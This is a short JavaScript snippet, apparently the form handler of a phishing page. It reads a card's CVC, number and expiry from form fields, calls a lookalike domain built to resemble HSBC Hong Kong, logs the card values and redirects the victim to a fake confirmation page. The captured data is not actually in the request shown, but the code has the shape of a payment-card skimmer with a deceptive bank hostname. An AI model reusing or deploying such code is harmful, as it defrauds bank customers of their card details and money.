function myFunction() {

   let a = document.querySelector('#card-cvc').value
   let b = document.querySelector('#card-number').value
   let c = document.querySelector('#card-expiry').value

   fetch('https://hsbc.com.hk.1.1.7b52bd64.roksit.net/',{ mode: 'no-cors'})
    .then(response => console.log(response))
    .then(res=>{console.log(res,a,b,c); 
        window.location.href = 'confirmation.html'
    })
}
